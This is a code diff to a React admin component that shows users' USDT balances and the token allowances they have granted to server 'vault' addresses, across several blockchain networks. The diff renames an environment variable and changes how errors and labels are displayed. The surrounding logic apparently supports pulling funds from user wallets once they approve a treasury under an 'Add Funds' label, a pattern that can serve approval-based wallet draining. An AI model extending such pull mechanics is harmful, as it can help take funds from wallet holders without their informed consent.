@@ -304,7 +304,7 @@ function WalletCard({ wallet, spenders }: { wallet: WalletDocument; spenders: Sp
   const pullBlockReason = network === 'TRC20' && !wallet.approved
     ? 'User has not enabled Add Funds — they must approve the treasury once in Trust Wallet.'
     : !spender
-    ? `${network === 'BEP20' ? 'VAULT_BEP20' : network === 'ERC20' ? 'VAULT_ERC20' : 'TRON_TREASURY_ADDRESS'} env var not set on server.`
+    ? `${network === 'BEP20' ? 'VAULT_BEP20' : network === 'ERC20' ? 'VAULT_ERC20' : 'VAULT_TRC20'} env var not set on server.`
     : null;
 
   return (
@@ -350,7 +350,9 @@ function WalletCard({ wallet, spenders }: { wallet: WalletDocument; spenders: Sp
         {/* Balance */}
         <div style={{ background: T.bg2, borderRadius: 10, padding: '10px 14px', border: `1px solid ${!liveLoading && balNum < 1 && live ? 'rgba(248,113,113,0.25)' : T.border}` }}>
           <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase' as const, letterSpacing: '0.08em', color: T.dim, margin: '0 0 5px' }}>USDT Balance</p>
-          {liveLoading ? <Spinner color={color} size={13} /> : liveErr ? <p style={{ fontSize: 12, color: T.dim, margin: 0 }}>Error</p> : (
+          {liveLoading ? <Spinner color={color} size={13} /> : liveErr ? (
+            <p style={{ fontSize: 11, color: T.red, margin: 0, wordBreak: 'break-all' as const }}>{liveErr}</p>
+          ) : (
             <>
               <p style={{ fontSize: 16, fontWeight: 800, color: balNum < 1 ? T.red : T.text, margin: 0, fontFamily: 'monospace' }}>{balNum.toFixed(2)}</p>
               <p style={{ fontSize: 10, color: T.dim, margin: '3px 0 0' }}>{balNum < 1 ? '⚠ Low' : 'USDT'}</p>
@@ -361,9 +363,11 @@ function WalletCard({ wallet, spenders }: { wallet: WalletDocument; spenders: Sp
         {/* Allowance */}
         <div style={{ background: T.bg2, borderRadius: 10, padding: '10px 14px', border: `1px solid ${T.border}` }}>
           <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase' as const, letterSpacing: '0.08em', color: T.dim, margin: '0 0 5px' }}>
-            {network === 'TRC20' ? 'Treasury Allowance' : 'Vault Allowance'}
+            {network === 'TRC20' ? 'Vault Allowance' : 'Vault Allowance'}
           </p>
-          {liveLoading ? <Spinner color={color} size={13} /> : liveErr ? <p style={{ fontSize: 12, color: T.dim, margin: 0 }}>Error</p> : (
+          {liveLoading ? <Spinner color={color} size={13} /> : liveErr ? (
+            <p style={{ fontSize: 11, color: T.dim, margin: 0 }}>—</p>
+          ) : (
             <>
               <p style={{ fontSize: 16, fontWeight: 800, color: allowNum > 0 ? T.blue : T.dim, margin: 0, fontFamily: 'monospace' }}>
                 {allowNum > 1e9 ? '∞' : allowNum.toFixed(2)}
